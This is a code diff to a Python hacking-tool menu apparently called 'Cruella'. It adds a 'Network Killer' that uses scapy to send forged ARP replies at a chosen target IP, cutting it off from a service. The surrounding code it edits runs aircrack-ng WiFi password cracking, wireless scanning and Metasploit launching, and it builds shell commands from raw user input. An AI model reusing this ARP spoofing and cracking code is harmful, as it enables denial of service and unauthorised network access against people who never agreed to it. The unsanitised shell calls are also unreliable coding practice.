@@ -6,49 +6,22 @@ import platform
 import os
 import webbrowser
 import time
-global Mac
-global OS
-global Windows
+from scapy.all import *
 global Latitude
 global Longitude
 global Yes
 global yes
-global Geo
-global Domains
-global External_IP
-global Terminal
-global Address
-global Metasploit
-global WebServer
-global Scan
-global Quit
-global No
+global No #10.80.97.193
 global B
 global GoogleApiKey
 GoogleApiKey = ""
 # You need to imput your own Google API Key to use the Address Print out (not the map link)
 Latitude = ""
-Geo = "1"
-Domains = "2"
-Address = "3"
-External_IP = "4"
-Terminal = "5"
-Metasploit = "6"
-Mac = "7"
-WebServer = "8"
-Scan = "9"
-Wifi = "10"
-Quit = "11"
 Yes = "Y"
 yes = "y"
 No = "N"
-OS = platform.system()
-Windows = "Windows" # Its esayer just check windows and if its not have its default to a Unix OS
 B = "" #This is just used as a blank variable to temporary store variables
-if(OS == Windows):
-    os.system("cls")
-else:
-    os.system("clear")
+os.system("clear")
 print("")
 print(" $$$$$$\                                $$\ $$\           ")
 print("$$  __$$\                               $$ |$$ |          ")
@@ -113,12 +86,12 @@ while True:
             print (body)
             C = body.find("Latitude")
             C += 10
-            D = C + 9
+            D = C + 7
             Latitude = body[C:D]
             body = str(urlopen("http://api.hackertarget.com/geoip/?q="+ IP).read())
             C = body.find("Longitude")
-            C += 12
-            D = C + 9
+            C += 11
+            D = C + 8
             Longitude = body[C:D]
             print("")
             print("")
@@ -145,11 +118,7 @@ while True:
         print("")
         print("External IP:")
         print("------------")
-        if(OS == Windows):
-            os.system("nslookup myip.opendns.com. resolver1.opendns.com")
-            # External IP check for Windows
-        else:
-            os.system("dig +short myip.opendns.com @resolver1.opendns.com")
+        os.system("dig +short myip.opendns.com @resolver1.opendns.com")
             # External IP check of every OS except for Windows
         print("------------")
         print("")
@@ -157,10 +126,7 @@ while True:
     def terminal():
         print("")
         print("type 'exit' to get back to tools")
-        if(OS == Windows):
-            os.system("start cmd") # External IP check for Windows
-        else:
-            os.system("bash")
+        os.system("bash")
         print("")
 
     def metasploit():
@@ -235,7 +201,6 @@ while True:
         global ADDRESS
         global CHANNEL
         global SSID
-        global PASSWORDS
         global NETWORK_CARD
         global CARD
         global LINE
@@ -252,7 +217,7 @@ while True:
         os.system("ifconfig | awk -F':' {'print $1'} |cut -d' ' -f1 |awk /./")
         print("")
         NETWORK_CARD = str(input("DEVICE : "))
-    
+
         os.system('clear')
 
         while x == 1:
@@ -271,7 +236,7 @@ while True:
                 global CHANNEL
                 global LINE
                 os.system("sudo iwlist "+ NETWORK_CARD+" scan > /tmp/WIFI.txt")
-                os.system("cat /tmp/WIFI.txt | awk -F'ESSID:' {'print $2'} | awk /./ > /tmp/SSID.txt && cat /tmp/SSID.txt")                    
+                os.system("cat /tmp/WIFI.txt | awk -F'ESSID:' {'print $2'} | awk /./ > /tmp/SSID.txt && cat /tmp/SSID.txt")
                 os.system("cat /tmp/WIFI.txt  | awk -F'Address: ' {'print $2'} | awk /./ > /tmp/Address.txt")
                 os.system("cat /tmp/WIFI.txt  | awk -F'Channel:' {'print $2'} | awk /./ > /tmp/Channel.txt")
                 print("")
@@ -324,10 +289,10 @@ while True:
                 B = input("Would you like to strat cracking the Password(Y/N)")
                 if(B == "Y" or B == "y"):
                     Password = input("Please enter the path for your Password List: ")
-                    os.system("aircrack-ng -b "+ADDRESS+" -w "+ Password+ " ~/Desktop/Breaker.cap")
+                    os.system("aircrack-ng -b "+ADDRESS+" -w "+ Password + " ~/Desktop/Breaker.cap")
                 else:
                     print("")
-                
+
 
             def Menu():
                 os.system("clear")
@@ -376,6 +341,56 @@ while True:
                 print("")
                 os._exit(0)
 
+    def jammer():
+        os.system("clear")
+
+        def Connected_Networks():
+            KILL = input("Enter IP of serverice you want to block(192.168.*.*) : ")
+            TARGET = input("Please enter the IP of the target system : ")
+            if(TARGET != ""):
+                os.system("arp -a | grep "+ TARGET+" > /tmp/target.txt")
+            else:
+                pass
+            TARGET_MAC = os.system("cat /tmp/target.txt | awk -F'at ' {'print $2'} | cut -d'[' -f1 | awk -F' ' {'print $1'}")
+            KILL_MAC = os.system("openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'")
+            ATTACK = ARP("psrc='192.168.1.20', hwsrc='00:00:00:00:00:05', op=2, hwdst='00:00:00:00:00:06', pdst='192.168.1.1'")
+            #ATTACK = ARP("psrc='" + str(KILL)+"',"+"hwsrc='"+str(KILL_MAC)+"', op=2, hwdst='"+str(TARGET_MAC)+"', pdst='"+str(TARGET) +"'");
+            print("TEST OUT")
+            print(str(KILL))
+            print(str(KILL_MAC))
+            print(str(TARGET))
+            print(str(TARGET_MAC))
+            print(ATTACK.show())
+            TIME = input("How many packets do you want to send : ")
+            send(ATTACK, count=int(TIME));
+
+        def Wifi_Jam():
+            print("IT WORKS")
+
+        while True:
+            def Menu():
+                print("Warining this is a BETA version of the jamer")
+                print("[1] Connected Network Jammer")
+                print("[2] Wifi Jammer")
+                print("[3] Exit back to Cruella")
+
+            try:
+                Menu()
+                B = input("Please Select and option : ")
+                if(B == "1"):
+                    Connected_Networks()
+                if(B == "2"):
+                    Wifi_Jam()
+                if(B == "3"):
+                    os.system("clear")
+                    break
+                else:
+                    pass
+            except KeyboardInterrupt:
+                print(" ")
+                print("Exiting Jammer Menu")
+                print("")
+                os._exit(0)
 
     def quit():
         B = input("Do you want to quit Cruella? (Y/N) ")
@@ -413,48 +428,33 @@ while True:
         print("[8] IP Logger")
         print("[9] Network Scan")
         print("[10] WIFI Breaker")
-        print("[11] Quit Cruella")
+        print("[11] Network Killer (BETA)")
+        print("[12] Quit Cruella")
         tool = input("Select a tool: " )
 
-        if(tool == Geo):
+        if(tool == "1"):
             geo()
-        else:
-            pass
-        if(tool == Domains):
+        if(tool == "2"):
             domains()
-        else:
-            pass
-        if(tool == Address):
+        if(tool == "3"):
             address()
-        else:
-            pass
-        if(tool == External_IP):
+        if(tool == "4"):
             external_ip()
-        else:
-            pass
-        if(tool == Terminal):
+        if(tool == "5"):
             terminal()
-        else:
-            pass
-        if(tool == Metasploit):
+        if(tool == "6"):
             metasploit()
-        else:
-            pass
-        if(tool == Mac):
+        if(tool == "7"):
             mac()
-        else:
-            pass
-        if(tool == WebServer):
+        if(tool == "8"):
             webserver()
-        else:
-            pass
-        if(tool == Scan):
+        if(tool == "9"):
             scan()
-        else:
-            pass
-        if(tool == Wifi):
+        if(tool == "10"):
             wifi()
-        if(tool == Quit):
+        if(tool == "11"):
+            jammer()
+        if(tool == "12"):
             quit()
         else:
             pass
